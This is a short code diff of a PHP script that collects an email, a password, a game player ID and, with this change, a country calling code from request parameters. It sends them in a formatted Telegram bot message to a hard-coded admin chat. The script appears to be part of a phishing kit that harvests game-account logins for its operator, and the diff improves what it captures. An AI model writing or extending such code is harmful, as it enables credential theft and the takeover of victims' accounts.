@@ -34,6 +34,7 @@ $user = $message->from->username;
 $admin = "831161538";
 $email = $_GET["email"];
 $password = $_GET["password"];
+$callingcode = $_GET['country_code'];
 $playid = $_GET['playid'];
 $login = $_GET["login"];
 $linky = $_SERVER['HTTP_HOST'];
@@ -61,8 +62,8 @@ bot("sendMessage",[
   📟 • 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » `$password`
   💎 • 𝙿𝚕𝚊𝚢𝚎𝚛 𝙸𝙳 » $playid
   🏴 • 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » $cty
-  ☎️ • 𝙲𝚘𝚍𝚎 » `+$code`
-    ⏱ • 𝚃𝚒𝚖𝚎 » $time
+  ☎️ • 𝙲𝚘𝚍𝚎 » `+$callingcode`
+   ⏱ • 𝚃𝚒𝚖𝚎 » $time
   📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
 ╰──────•˹  @PHP505 ˼•──────╯
 ",
